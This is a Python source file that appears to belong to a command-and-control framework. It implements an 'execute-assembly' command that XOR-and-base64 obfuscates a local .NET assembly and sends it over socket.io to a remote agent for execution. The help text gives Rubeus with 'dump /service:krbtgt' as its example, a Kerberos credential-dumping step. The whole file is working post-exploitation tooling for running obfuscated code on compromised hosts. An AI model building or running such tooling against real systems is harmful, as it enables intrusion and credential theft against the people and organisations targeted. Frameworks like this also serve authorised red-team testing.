import os
from .commands import ExecutionCommand
from connect.convert import xor_base64
from connect.output import display


class ExecuteAssembly(ExecutionCommand):
    def __init__(self):
        super().__init__(
            'execute-assembly',
            'Execute a .NET assembly',
            parameters={
                'assembly_path': 'The path to the .NET assembly you want to execute (e.g., Rubeus.exe)',
                'arguments': 'The arguments to send to the assembly (e.g., dump /service:krbtgt)'
            }
        )

    def execute_command(self, parameters, current_agent, client_sio):
        if not parameters:
            self.help()
            return

        assembly_path = parameters[0]
        if not os.path.exists(assembly_path):
            display(f'{assembly_path} does not exist', 'ERROR')
            return

        assembly_arguments = []
        for parameter in parameters[1:]:
            assembly_arguments.append(parameter)

        base64_assembly_to_execute, key = xor_base64(open(assembly_path, 'rb').read())

        shell_task = {
            'create': {
                'agent': current_agent,
                'method': self.name,
                'type': 1,
                'module': self.module,
                'parameters': [
                    base64_assembly_to_execute,
                    key,
                    *assembly_arguments
                ]
            }
        }
        client_sio.emit('task', shell_task)

    @property
    def usage(self) -> str:
        return """\
        usage:
            execute-assembly <assembly_path> [arguments...]
        """
